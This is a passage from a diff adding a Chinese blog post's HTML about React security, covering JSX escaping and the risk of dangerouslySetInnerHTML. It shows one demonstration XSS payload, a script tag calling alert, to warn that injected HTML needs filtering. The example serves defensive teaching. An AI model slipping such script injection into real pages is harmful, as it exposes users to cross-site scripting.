+<li>By default, React DOM escapes any values embedded in JSX before rendering them. Thus it ensures that you can never inject anything that&#x2019;s not explicitly written in your application. Everything is converted to a string before being rendered. This helps prevent XSS attacks.<a href="https://facebook.github.io/react/docs/introducing-jsx.html" target="_blank" rel="external">https://facebook.github.io/react/docs/introducing-jsx.html</a></li>
+<li>&#x4F46;&#x4E8B;&#x60C5;&#x4E5F;&#x4E0D;&#x662F;&#x7EDD;&#x5BF9;&#x7684;&#xFF0C;&#x5728;&#x5229;&#x7528;dangerouslySetInnerHTML&#x6CE8;&#x5165;html&#x65F6;&#x4E5F;&#x8981;&#x6CE8;&#x610F;&#x8FC7;&#x6EE4;&#x7279;&#x6B8A;&#x5B57;&#x7B26;<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;div dangerouslySetInnerHTML={{<span class="attr">__html</span>: <span class="string">`&lt;script&gt;alert(&#x2018;XSS&#x2019;)&lt;/script&gt;`</span>}} /&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2017/08/18/编程/React的JSX语法简单支持if判断/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">React的JSX语法简单支持if判断</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">分享到: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+</div>
+      <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2017 King
+    	</div>
+    	<div class="footer-right">
+    		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+    	</div>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+  </div>
+</body>
+</html>
